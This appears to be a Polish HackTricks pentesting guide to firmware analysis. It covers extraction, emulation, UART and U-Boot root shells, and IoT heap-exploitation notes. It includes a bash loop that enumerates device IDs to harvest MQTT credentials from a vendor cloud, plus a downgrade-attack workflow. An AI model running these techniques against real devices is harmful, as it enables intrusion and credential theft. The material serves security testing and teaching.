# Analiza firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Wprowadzenie**

### Powiązane zasoby

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń, zarządzając komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy wchodzą w interakcję, i ułatwiając ją. Jest przechowywane w pamięci trwałej, dzięki czemu urządzenie ma dostęp do kluczowych instrukcji od momentu włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza firmware i jego ewentualna modyfikacja to kluczowe kroki w identyfikowaniu luk w zabezpieczeniach.<sup>[[2]](#references)[[3]](#references)</sup>

## **Zbieranie informacji**

**Zbieranie informacji** to kluczowy pierwszy etap pozwalający poznać budowę urządzenia i wykorzystywane w nim technologie. Proces ten obejmuje gromadzenie danych dotyczących:

- Architektury CPU i używanego systemu operacyjnego
- Szczegółów dotyczących bootloadera
- Układu sprzętowego i kart katalogowych
- Metryk bazy kodu i lokalizacji źródeł
- Bibliotek zewnętrznych i typów licencji
- Historii aktualizacji i certyfikatów zgodności z przepisami
- Diagramów architektury i przepływu
- Oceny bezpieczeństwa i zidentyfikowanych luk

W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza dostępnych komponentów oprogramowania open source za pomocą ręcznych i zautomatyzowanych procesów przeglądu. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.

## **Pozyskiwanie firmware**

Firmware można pozyskać na różne sposoby, z których każdy wiąże się z innym poziomem złożoności:

- **Bezpośrednio** ze źródła (od twórców, producentów)
- **Budując** go na podstawie dostarczonych instrukcji
- **Pobierając** z oficjalnych stron pomocy technicznej
- Używając zapytań **Google dork** do wyszukiwania hostowanych plików firmware
- Uzyskując bezpośredni dostęp do **cloud storage** za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **aktualizacje** za pomocą technik man-in-the-middle
- **Wyodrębniając** firmware z urządzenia przez połączenia takie jak **UART**, **JTAG** lub **PICit**
- **Nasłuchując** żądań aktualizacji w komunikacji urządzenia
- Identyfikując i używając **zakodowanych na stałe endpointów aktualizacji**
- **Zrzucając** dane z bootloadera lub sieci
- **Wyjmując i odczytując** układ pamięci, gdy zawiodą pozostałe metody, za pomocą odpowiednich narzędzi sprzętowych

### Logi dostępne wyłącznie przez UART: wymuszenie root shell przez środowisko U-Boot zapisane w pamięci flash

Jeśli UART RX jest ignorowany (dostępne są tylko logi), nadal można wymusić init shell, **edytując offline blob środowiska U-Boot**:<sup>[[6]](#references)</sup>

1. Zrzuć zawartość pamięci SPI flash za pomocą klipsa SOIC-8 i programatora (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Zlokalizuj partycję env U-Boot, edytuj `bootargs`, aby dodać `init=/bin/sh`, i **ponownie oblicz CRC32 env U-Boot** dla blobu.
3. Zapisz ponownie tylko partycję env i uruchom urządzenie ponownie; na UART powinien pojawić się shell.

Przydatne w przypadku urządzeń embedded, w których shell bootloadera jest wyłączony, ale partycję env można zapisywać przez zewnętrzny dostęp do pamięci flash.

## Analiza firmware

Skoro **masz już firmware**, musisz wyodrębnić z niego informacje, aby wiedzieć, jak z nim postępować. Możesz użyć do tego różnych narzędzi:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Jeśli za pomocą tych narzędzi nie znajdziesz zbyt wiele, sprawdź **entropię** obrazu poleceniem `binwalk -E <bin>`. Niska entropia oznacza, że obraz prawdopodobnie nie jest zaszyfrowany. Wysoka entropia oznacza, że prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).

Możesz też użyć tych narzędzi, aby wyodrębnić **pliki osadzone w firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), aby sprawdzić plik.

### Pozyskiwanie systemu plików

Za pomocą wspomnianych wcześniej narzędzi, takich jak `binwalk -ev <bin>`, powinno udać Ci się **wyodrębnić system plików**.\
Binwalk zazwyczaj wyodrębnia go do **folderu o nazwie odpowiadającej typowi systemu plików**. Zwykle jest to jeden z następujących typów: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami sygnatury binwalk nie zawierają **magic byte systemu plików**. W takich przypadkach użyj binwalk, aby **znaleźć offset systemu plików, a następnie wytnij skompresowany system plików z pliku binarnego i ręcznie go wyodrębnij** zgodnie z jego typem, korzystając z poniższych instrukcji.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Uruchom poniższe **polecenie dd**, aby wydzielić system plików Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatywnie można również uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki znajdą się później w katalogu "`squashfs-root`".

- Pliki archiwum CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs z pamięcią flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza firmware

Po uzyskaniu firmware należy go dokładnie przeanalizować, aby zrozumieć jego strukturę i potencjalne luki w zabezpieczeniach. Proces ten obejmuje wykorzystanie różnych narzędzi do analizy i wyodrębniania cennych danych z obrazu firmware.

### Narzędzia do wstępnej analizy

Poniżej przedstawiono zestaw poleceń do wstępnej inspekcji pliku binarnego (oznaczonego jako `<bin>`). Pomagają one określić typy plików, wyodrębniać ciągi znaków, analizować dane binarne oraz poznać szczegóły partycji i systemu plików:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Aby ocenić, czy obraz jest zaszyfrowany, sprawdza się jego **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka może wskazywać na szyfrowanie lub kompresję.

Do **wyodrębniania osadzonych plików** polecane są narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Za pomocą `binwalk -ev <bin>` można zwykle wyodrębnić system plików, często do katalogu nazwanego zgodnie z jego typem (np. squashfs, ubifs). Jeśli jednak **binwalk** nie rozpoznaje typu systemu plików z powodu braku bajtów sygnatury, konieczne jest ręczne wyodrębnienie. Polega ono na użyciu `binwalk` do zlokalizowania offsetu systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Następnie, w zależności od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), do ręcznego wyodrębnienia zawartości używa się różnych poleceń.

### Analiza systemu plików

Po wyodrębnieniu systemu plików rozpoczyna się poszukiwanie luk w zabezpieczeniach. Zwraca się uwagę na niezabezpieczone demony sieciowe, zakodowane na stałe dane uwierzytelniające, endpointy API, funkcje serwera aktualizacji, niekompilowany kod, skrypty startowe oraz skompilowane pliki binarne przeznaczone do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia obejmują:

- **etc/shadow** i **etc/passwd** — dane uwierzytelniające użytkowników
- Certyfikaty i klucze SSL w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk
- Wbudowane pliki binarne do dalszej analizy
- Typowe serwery WWW i pliki binarne urządzeń IoT

Wykrywanie poufnych informacji i luk w systemie plików ułatwiają różne narzędzia:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych plików binarnych

Zarówno kod źródłowy, jak i skompilowane pliki binarne znalezione w systemie plików należy dokładnie sprawdzić pod kątem luk. Narzędzia takie jak **checksec.sh** dla plików binarnych Unix i **PESecurity** dla plików binarnych Windows pomagają wykryć niezabezpieczone pliki binarne, które można wykorzystać.

## Pozyskiwanie konfiguracji chmurowej i danych uwierzytelniających MQTT za pomocą tokenów URL wyliczanych na podstawie danych urządzenia

Wiele hubów IoT pobiera konfigurację dla poszczególnych urządzeń z endpointu w chmurze o postaci:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware można odkryć, że `<token>` jest lokalnie wyliczany na podstawie identyfikatora urządzenia przy użyciu zakodowanego na stałe sekretu, na przykład:

- token = MD5( deviceId || STATIC_KEY ) i zapisany jako wielkie litery w zapisie szesnastkowym

Taka konstrukcja pozwala każdemu, kto pozna deviceId i STATIC_KEY, odtworzyć URL i pobrać konfigurację z chmury, która często ujawnia dane uwierzytelniające MQTT w postaci jawnej oraz prefiksy tematów.

Praktyczny przebieg działań:

1) Wyodrębnij deviceId z logów rozruchowych UART

- Podłącz adapter UART 3,3 V (TX/RX/GND) i przechwyć logi:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Poszukaj wierszy wypisujących wzorzec URL konfiguracji chmury i adres brokera, na przykład:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Odzyskaj STATIC_KEY i algorytm tokenu z firmware

- Załaduj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wyznacz token w Bash i zamień skrót na wielkie litery:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Pozyskiwanie konfiguracji chmurowej i poświadczeń MQTT

- Złóż URL i pobierz JSON za pomocą curl; użyj jq do wyodrębnienia sekretów:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Wykorzystaj MQTT przesyłający dane jawnym tekstem oraz słabe ACL-e tematów (jeśli występują)

- Użyj odzyskanych poświadczeń, aby zasubskrybować tematy konserwacyjne i wyszukać poufne zdarzenia:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Wylicz przewidywalne identyfikatory urządzeń (na dużą skalę, za zgodą)

- Wiele ekosystemów używa bajtów OUI dostawcy, produktu i typu, po których następuje sekwencyjny sufiks.
- Możesz iterować po potencjalnych identyfikatorach, programowo generować tokeny i pobierać konfiguracje:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Uwagi
- Zawsze uzyskaj wyraźną zgodę przed podjęciem prób masowej enumeracji.
- Jeśli to możliwe, preferuj emulację lub analizę statyczną, aby odzyskać sekrety bez modyfikowania docelowego sprzętu.

Proces emulacji firmware umożliwia **analizę dynamiczną** działania urządzenia lub pojedynczego programu. Podejście to może wiązać się z wyzwaniami wynikającymi z zależności od sprzętu lub architektury, ale przeniesienie głównego systemu plików lub określonych plików binarnych na urządzenie o zgodnej architekturze i kolejności bajtów, takie jak Raspberry Pi, albo na gotową maszynę wirtualną może ułatwić dalsze testy.

### Emulowanie pojedynczych plików binarnych

Aby analizować pojedyncze programy, kluczowe jest ustalenie ich kolejności bajtów i architektury procesora.

#### Przykład z architekturą MIPS

Do emulacji pliku binarnego dla architektury MIPS można użyć polecenia:

```bash
file ./squashfs-root/bin/busybox
```

A także, aby zainstalować niezbędne narzędzia do emulacji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Dla MIPS (big-endian) używa się `qemu-mips`, a w przypadku binariów little-endian odpowiednim wyborem będzie `qemu-mipsel`.

#### Emulacja architektury ARM

W przypadku binariów ARM proces jest podobny — do emulacji wykorzystuje się emulator `qemu-arm`.

### Pełna emulacja systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne ułatwiają pełną emulację firmware, automatyzując ten proces i wspomagając analizę dynamiczną.

### Odtwarzanie podzielonych i weryfikowanych głównych systemów plików na potrzeby emulacji

Jeśli superblok SquashFS jest czytelny, ale przesunięcia inode, katalogów lub tablicy fragmentów są niemożliwe do ustalenia, nie modyfikuj od razu `unsquashfs`. Przeanalizuj wczesny plik binarny startowy i odtwórz tworzony przez niego graf urządzeń blokowych: systemy wbudowane mogą udostępniać nominalną partycję główną, ale tworzyć rzeczywisty system plików za pomocą mapowania `dm-linear`, które dołącza sektory pobrane z innej partycji. Kontrole obejmujące wyłącznie superblok mogą przejść pomyślnie, mimo że wszystkie późniejsze bloki metadanych są przesunięte.<sup>[[9]](#references)</sup>

Dokładnie zachowaj sposób wykonywania obliczeń przez firmware. Ustal w szczególności, czy długości są podawane w bajtach, sektorach 512-bajtowych czy stronach 4 KiB; odtwórz przesunięcia bitowe i obcinanie wartości w pierwotnej kolejności; uwzględnij też zależne od banku obszary końcowe w układach A/B. Na przykład `(partition_bytes >> 12) << 3` najpierw obcina wartość do granicy 4 KiB, a dopiero potem wyraża wynik w sektorach 512-bajtowych; zastąpienie tego przez `partition_bytes // 512` może przesunąć dołączany zakres o kilka kilobajtów i uszkodzić wszystkie dalsze tablice SquashFS.<sup>[[9]](#references)</sup>

Przydatny proces weryfikacji:<sup>[[9]](#references)</sup>

1. Ustal na podstawie binariów verifier/init urządzenie źródłowe, początkowy sektor i długość każdego segmentu `dm-linear`.
2. Połącz lub zamapuj zakresy, nie zmieniając zasad ich wyrównywania.
3. Jeśli ekstrakcja nadal się nie powiedzie, przeszukaj tylko niewielki obszar wokół przewidywanej granicy i wymagaj kilku kolejnych prawidłowych struktur metadanych, zamiast uznawać za wystarczający sam wiarygodnie wyglądający superblok.
4. Uruchom niezmodyfikowane `unsquashfs` na odtworzonym obrazie; poprawne przejście przez wszystkie katalogi i fragmenty stanowi mocniejszy dowód niż `unsquashfs -stat`.

#### Zastąpienie dm-verity kontrolowane przez analityka

Gdy analityk kontroluje jądro QEMU, initramfs i dyski wirtualne, zmodyfikowany root można uruchomić, zastępując dostarczony przez producenta PID 1 weryfikujący system plików niewielkim, statycznie linkowanym init. Jest to **podmiana łańcucha rozruchowego w laboratorium**, a nie złamanie dm-verity, jego podpisu RSA, Secure Boot ani klucza chronionego przez TPM.<sup>[[9]](#references)</sup>

Zastępczy init powinien odtwarzać operacyjne elementy pierwotnej ścieżki rozruchu: zamontować `devtmpfs`, wywołać `setsid()`, podłączyć `/dev/console` do deskryptorów plików 0–2, zamontować `/proc` i `/sys`, poczekać na udostępnione urządzenie blokowe, zamontować zmodyfikowany root tylko do odczytu, odłączyć pseudo-systemy plików starego roota, przenieść nowy system plików na `/`, wykonać `chroot` i `execve()` pierwotnego `/sbin/init` z firmware. Odłączenie `/dev`, `/proc` i `/sys` **przed** `MS_MOVE` zapobiega przypadkowemu odłączeniu punktów montowania należących do nowego roota.<sup>[[9]](#references)</sup>

Oddziel zmienny stan urządzenia od zmodyfikowanego, niemodyfikowalnego roota. Nakładka qcow2 może zachować stan LVM oryginalnego dysku, podczas gdy drugi dysk virtio zamontowany tylko do odczytu udostępnia zmodyfikowany SquashFS:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debugowanie stanu obrazu offline

Sprawdź trwały stan poza systemem gościa, gdy długie uruchamianie, destrukcyjne skrypty startowe lub zawodne logowanie konsoli utrudniają znalezienie przyczyny awarii. Nigdy nie podłączaj overlay używanego przez działającą maszynę wirtualną; udostępnij go za pomocą `qemu-nbd`, ogranicz wykrywanie LVM do właściwej partycji NBD i dezaktywuj grupę woluminów przed jej odłączeniem.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Aby uzyskać powtarzalne wyniki izolacji usterek, zapisuj pliki znaczników z sygnaturą czasową na stabilnym, zapisywalnym woluminie i weryfikuj je offline; `/dev/kmsg`, FIFO i nietrwałe konsole mogą powodować fałszywie negatywne wyniki z powodu ograniczania częstotliwości lub przedwczesnego zakończenia procesu. Zanim zmienisz niezwiązany kod, porównaj też dokładne interfejsy między warstwami: `uname -r` z `/lib/modules/`, funkcje ext4 zapisane na dysku z konfiguracją jądra oraz generację Mesa `libGL` z ABI sterownika DRI i nazwami sterowników wynikającymi z PCI. Komponent może istnieć, a nawet pomyślnie przejść `dlopen()`, ale nadal być bezużyteczny, jeśli jego odbiorca oczekuje innego ABI.<sup>[[9]](#references)</sup>

## Analiza dynamiczna w praktyce

Na tym etapie do analizy wykorzystuje się rzeczywiste lub emulowane środowisko urządzenia. Niezbędne jest zachowanie dostępu do powłoki systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać idealnie interakcji ze sprzętem, dlatego czasami trzeba ją ponownie uruchomić. Analiza powinna ponownie objąć system plików, wykorzystanie ujawnionych stron internetowych i usług sieciowych oraz badanie luk w bootloaderze. Testy integralności firmware’u mają kluczowe znaczenie przy identyfikowaniu potencjalnych luk typu backdoor.

## Techniki analizy w czasie działania

Analiza w czasie działania polega na interakcji z procesem lub plikiem binarnym w jego środowisku operacyjnym. Wykorzystuje się do tego narzędzia takie jak gdb-multiarch, Frida i Ghidra, aby ustawiać punkty przerwania oraz identyfikować luki za pomocą fuzzingu i innych technik.

W przypadku celów wbudowanych bez pełnego debuggera **skopiuj na urządzenie statycznie linkowany `gdbserver` i podłącz się zdalnie**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapowanie komunikatów Zigbee / koprocesora radiowego

W hubach IoT stos RF jest często podzielony między **radio MCU** a proces działający w przestrzeni użytkownika Linuksa. Przydatny workflow polega na zmapowaniu ścieżki:<sup>[[8]](#references)</sup>

1. **Ramka RF** przesyłana drogą radiową
2. **Parser po stronie kontrolera** w radio MCU
3. **Tekstowy protokół szeregowy/UART lub TLV** przekazywany do Linuksa (na przykład przez `/dev/tty*`)
4. **Dispatcher aplikacji** w głównym daemonie
5. **Handler specyficzny dla protokołu / maszyna stanów**

Ta architektura daje dwa cele do analizy zamiast jednego. Jeśli kontroler konwertuje binarne ramki radiowe na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, ustal:

- **Grupy komunikatów** i tabele dispatchera
- Które komunikaty mogą pochodzić z **sieci**, a które od samego kontrolera
- Dokładne **pola rozróżniające specyficzne dla producenta** (na przykład Zigbee `manufacturer_code` i niestandardowy `cluster_command`)
- Do których handlerów można dotrzeć tylko podczas **commissioningu**, wykrywania lub pobierania firmware’u/modelu

W przypadku Zigbee przechwyć ruch parowania i sprawdź, czy urządzenie nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, podsłuchanie ruchu podczas commissioningu może ujawnić **Network Key**. Kody instalacyjne Zigbee 3.0 ograniczają to ryzyko, dlatego sprawdź, czy testowane urządzenie faktycznie ich wymaga.

### Handlery protokołów specyficzne dla producenta i osiągalność kontrolowana przez FSM

Niestandardowe komendy Zigbee/ZCL producenta są często lepszym celem niż standaryzowane klastry, ponieważ trafiają do **niestandardowego kodu parsującego** i wewnętrznych **FSM**, które przeszły mniej gruntowne testy walidacji.<sup>[[8]](#references)</sup>

Praktyczny workflow:

- Analizuj dispatcher komend wstecz, aż znajdziesz **handler dostępny wyłącznie dla producenta**.
- Odtwórz tabele **stanu FSM**, **zdarzeń**, **warunków**, **akcji** i **następnego stanu**.
- Znajdź **stany przejściowe**, które automatycznie przechodzą dalej, oraz gałęzie ponawiania prób/błędów, które ostatecznie resetują lub zwalniają kontrolowany przez atakującego stan.
- Ustal, jakie prawidłowe wymiany protokołu są potrzebne, by wprowadzić daemon w podatny stan; nie zakładaj, że do wadliwego handlera można zawsze dotrzeć.

W przypadku protokołów wrażliwych na opóźnienia odtwarzanie pakietów z poziomu frameworka Python może być zbyt wolne. Bardziej niezawodnym podejściem jest emulowanie prawidłowego urządzenia na rzeczywistym sprzęcie (na przykład **nRF52840**) z użyciem stosu klasy enterprise, aby udostępnić właściwe **endpointy**, **atrybuty** i timing commissioningu.

### Klasa błędów w pobieraniu fragmentowanym w daemonach embedded

Powtarzająca się klasa błędów firmware’u występuje przy **fragmentowanym pobieraniu blobów/modeli/konfiguracji**:<sup>[[8]](#references)</sup>

1. **Pierwszy fragment** (`offset == 0`) zapisuje `ctx->total_size` i alokuje `malloc(total_size)`.
2. Późniejsze fragmenty walidują tylko kontrolowane przez atakującego pola **dotyczące bieżącego pakietu**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzenia, czy zapis mieści się w **pierwotnie zaalokowanym rozmiarze**.

Pozwala to atakującemu wysłać:

- Pierwszy prawidłowy fragment z zadeklarowanym **małym** rozmiarem całkowitym, aby wymusić małą alokację na stercie.
- Późniejszy fragment z **oczekiwanym offsetem**, ale większym `chunk_len`.
- Sfałszowany lokalny rozmiar pakietu, który przechodzi nowe kontrole, a jednocześnie powoduje przepełnienie pierwotnie zaalokowanego bufora.

Jeśli podatna ścieżka jest dostępna dopiero po przejściu logiki commissioningu, exploitacja musi obejmować wystarczającą **emulację urządzenia**, aby wprowadzić cel w oczekiwany stan pobierania modelu lub bloba przed wysłaniem wadliwych fragmentów.

### Wyzwalanie `free()` przez protokół

W daemonach embedded najłatwiej wyzwolić wykorzystanie metadanych sterty często nie przez „czekanie na czyszczenie”, lecz przez **wymuszenie obsługi błędu przez sam protokół**:<sup>[[8]](#references)</sup>

- Wyślij wadliwe kolejne fragmenty, aby wprowadzić FSM w stany **ponawiania próby** lub **błędu**.
- Przekrocz limit ponowień, aby daemon **zresetował kontekst** i zwolnił uszkodzony bufor.
- Wykorzystaj to przewidywalne `free()`, aby uruchomić prymitywy po stronie alokatora, zanim proces ulegnie awarii z innych powodów.

Jest to szczególnie przydatne w przypadku alokatorów **musl/uClibc/dlmalloc-podobnych** w embedded Linux, gdzie uszkodzenie metadanych chunka może zamienić logikę unlink/unbin w prymityw zapisu. Stabilnym podejściem jest uszkodzenie **pola rozmiaru**, by przekierować przechodzenie alokatora do **fałszywych chunków umieszczonych w przepełnionym buforze**, zamiast od razu nadpisywać rzeczywiste wskaźniki binów i powodować awarię procesu.

## Eksploitacja binarna i Proof-of-Concept

Tworzenie PoC dla zidentyfikowanych podatności wymaga dogłębnego zrozumienia architektury celu i programowania w językach niższego poziomu. Zabezpieczenia środowiska uruchomieniowego binariów w systemach embedded są rzadkie, ale gdy występują, mogą być potrzebne techniki takie jak Return Oriented Programming (ROP).

### Uwagi dotyczące eksploatacji fastbin w uClibc (embedded Linux)

- **Fastbiny + konsolidacja:** uClibc używa fastbinów podobnie jak glibc. Późniejsza duża alokacja może wywołać `__malloc_consolidate()`, więc każdy fałszywy chunk musi przejść kontrole (sensowny rozmiar, `fd = 0` i sąsiednie chunki uznawane za „zajęte”).<sup>[[6]](#references)</sup>
- **Binarne pliki non-PIE przy włączonym ASLR:** jeśli ASLR jest włączony, ale główny plik binarny jest **non-PIE**, adresy `.data/.bss` wewnątrz binarnego pliku są stabilne. Można wybrać obszar przypominający prawidłowy nagłówek chunka sterty, aby skierować alokację fastbin do **tablicy wskaźników do funkcji**.
- **NUL zatrzymujący parser:** podczas parsowania JSON znak `\x00` w payloadzie może zatrzymać parsowanie, pozostawiając dalsze bajty kontrolowane przez atakującego do wykorzystania w stack pivot/łańcuchu ROP.
- **Shellcode przez `/proc/self/mem`:** łańcuch ROP wywołujący `open("/proc/self/mem")`, `lseek()` i `write()` może umieścić wykonywalny shellcode w znanym mapowaniu i przekazać do niego sterowanie.

## Przygotowane systemy operacyjne do analizy firmware’u

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) udostępniają wstępnie skonfigurowane środowiska do testowania bezpieczeństwa firmware’u, wyposażone w niezbędne narzędzia.

## Przygotowane systemy operacyjne do analizy firmware’u

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do przeprowadzania oceny bezpieczeństwa i testów penetracyjnych urządzeń Internetu rzeczy (IoT). Oszczędza dużo czasu, udostępniając wstępnie skonfigurowane środowisko ze wszystkimi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do testowania bezpieczeństwa systemów embedded, oparty na Ubuntu 18.04 i wyposażony w narzędzia do testowania bezpieczeństwa firmware’u.

## Ataki polegające na downgrade firmware’u i niezabezpieczone mechanizmy aktualizacji

Nawet gdy producent implementuje weryfikację podpisów kryptograficznych obrazów firmware’u, **ochrona przed cofnięciem wersji (downgrade) jest często pomijana**. Jeśli bootloader lub loader odzyskiwania weryfikuje jedynie podpis za pomocą osadzonego klucza publicznego, ale nie porównuje *wersji* (lub monotonicznego licznika) wgrywanego obrazu, atakujący może legalnie zainstalować **starszy, podatny firmware z prawidłowym podpisem**, przywracając w ten sposób załatane podatności.<sup>[[4]](#references)</sup>

Typowy przebieg ataku:

1. **Zdobądź starszy podpisany obraz**
   * Pobierz go z publicznego portalu pobierania producenta, CDN-u lub strony pomocy technicznej.
   * Wyodrębnij go z towarzyszących aplikacji mobilnych/desktopowych (np. z `assets/firmware/` w pliku Android APK).
   * Znajdź go w repozytoriach zewnętrznych, takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Prześlij obraz do urządzenia lub udostępnij go urządzeniu** przez dowolny dostępny kanał aktualizacji:
   * Interfejs webowy, API aplikacji mobilnej, USB, TFTP, MQTT itp.
   * Wiele konsumenckich urządzeń IoT udostępnia *nieuwierzytelnione* endpointy HTTP(S), które przyjmują bloby firmware’u zakodowane w Base64, dekodują je po stronie serwera i uruchamiają odzyskiwanie/aktualizację.
3. Po downgrade wykorzystaj podatność załatana w nowszym wydaniu (na przykład filtr command injection dodany później).
4. Opcjonalnie wgraj z powrotem najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu trwałego dostępu.

### Przykład: Command Injection po downgrade

```http
